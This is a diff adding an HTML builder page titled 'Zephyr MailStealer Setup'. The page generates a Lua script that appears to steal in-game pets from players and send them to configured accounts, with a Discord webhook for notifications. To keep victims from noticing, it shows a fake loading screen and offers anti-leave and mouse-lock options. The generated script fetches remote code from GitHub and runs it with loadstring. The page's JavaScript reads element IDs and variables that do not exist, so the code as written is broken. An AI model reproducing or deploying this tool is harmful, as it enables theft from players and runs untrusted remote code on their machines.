@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zephyr MailStealer Setup</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      background-color: #f2f2f2;
+      background-image: url('https://cdn.discordapp.com/attachments/1167811729061859501/1170033125468934294/standard_1.gif?ex=65579143&is=65451c43&hm=6da224651d13a73f1618e6386fc012951c1b240a5759d444a28bbfda628422a0&');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    .container {
+      background-color: #fff;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      margin: auto;
+      margin-top: 50px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+      font-size: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 4px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+      transition: background-color 0.3s ease-in-out;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #scriptOutput {
+      margin-top: 20px;
+    }
+
+    pre {
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      padding: 10px;
+      border-radius: 4px;
+      overflow: auto;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="container">
+    <h1>Zephyr MailStealer Setup</h1>
+    <form id="setupForm">
+      <label for="userName">User to send good pets to:</label>
+      <input type="text" id="userName" required><br>
+
+      <label for="userName2">User to send bad pets to:</label>
+      <input type="text" id="userName2" required><br>
+
+      <label for="webhook">Webhook for notifications:</label>
+      <input type="text" id="webhook" required><br>
+
+      <label for="loadingscreenNameText">Loading screen Name text:</label>
+      <input type="text" id="loadingscreenNameText" required><br>
+
+      <label for="LoadingscreenFirstText">Loading screen First text:</label>
+      <input type="text" id="LoadingscreenFirstText" required><br>
+
+      <label for="LoadingscreenSecondText">Loading screen Second text:</label>
+      <input type="text" id="LoadingscreenSecondText" required><br>
+
+      <label for="LoadingscreenThirdText">Loading screen third text:</label>
+      <input type="text" id="LoadingscreenThirdText" required><br>
+
+      <label for="LoadingscreenWaitingText">Loading screen waiting text:</label>
+      <input type="text" id="LoadingscreenWaitingText" required><br>
+
+      <label for="antiLeave">Anti-leave (true/false):</label>
+      <input type="text" id="antiLeave" required><br>
+
+      <label for="MouseLock">Mouse-Lock (true/false):</label>
+      <input type="text" id="MouseLock" required><br>
+
+      <button type="button" id="generateScriptBtn">Generate Script</button>
+    </form>
+
+    <button type="button" id="copyScriptBtn">Copy Script</button>
+    <a id="downloadScriptBtn" download="ZephyrMail.lua"><button>Download Script</button></a>
+    
+    <div id="scriptOutput" style="display: none;">
+      <h2>Generated Script:</h2>
+      <pre id="scriptCode"></pre>
+    </div>
+  </div>
+
+  <script>
+    const generateScriptBtn = document.getElementById("generateScriptBtn");
+    const copyScriptBtn = document.getElementById("copyScriptBtn");
+    const downloadScriptBtn = document.getElementById("downloadScriptBtn");
+    const scriptOutput = document.getElementById("scriptOutput");
+    const scriptCode = document.getElementById("scriptCode");
+
+    generateScriptBtn.addEventListener("click", () => {
+      const userName = document.getElementById("userName").value;
+      const userName2 = document.getElementById("userName2").value;
+      const webhook = document.getElementById("webhook").value;
+      const loadingScreenText = document.getElementById("loadingScreenText").value;
+      const chatMessage = document.getElementById("chatMessage").value;
+      const kickTime = document.getElementById("kickTime").value;
+      const loadingScreen = document.getElementById("loadingScreen").value;
+      const antiLeave = document.getElementById("antiLeave").value;
+      const MouseLock = document.getElementById("MouseLock").value;
+      const ChatSpam = document.getElementById("ChatSpam").value;
+      const CollectOrbs = document.getElementById("CollectOrbs").value;
+
+      const generatedScript = `--[[ Zephyr Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+UserName = "${userName}"
+UserName2 = "${userName2}"
+
+--[[ Webhook Config ]]--
+
+Webhook = "{webhook}"
+
+
+--[[ Configure ]]--
+
+_G.LoadingScreen = ${loadingScreen}
+_G.AntiLeave = ${antiLeave}
+_G.MouseLock = ${MouseLock}
+
+--[[ LoadingScreen Configure ]]
+
+_G.ScriptName = "${loadingscreenNameText}"
+_G.FirstText = "${loadingscreenFirstText}"
+_G.SecondText = "${loadingscreenSecondText}"
+_G.ThirdText = "${loadingscreenThirdText}"
+_G.WaitingTime = ${loadingscreenWaitingText} -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+--[[ Scripts ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jerichopogi1/Zephy/main/Ze.lua",true))()`;
+
+      scriptCode.textContent = generatedScript;
+      scriptOutput.style.display = "block";
+    });
+
+    copyScriptBtn.addEventListener("click", () => {
+      const scriptText = scriptCode.textContent;
+      navigator.clipboard.writeText(scriptText)
+        .then(() => {
+          alert("Script copied to clipboard!");
+        })
+        .catch((error) => {
+          console.error("Copy failed:", error);
+        });
+    });
+
+    downloadScriptBtn.addEventListener("click", () => {
+      const scriptText = scriptCode.textContent;
+      const blob = new Blob([scriptText], { type: "text/plain;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      downloadScriptBtn.setAttribute("href", url);
+    });
+  </script>
+</body>
+</html>
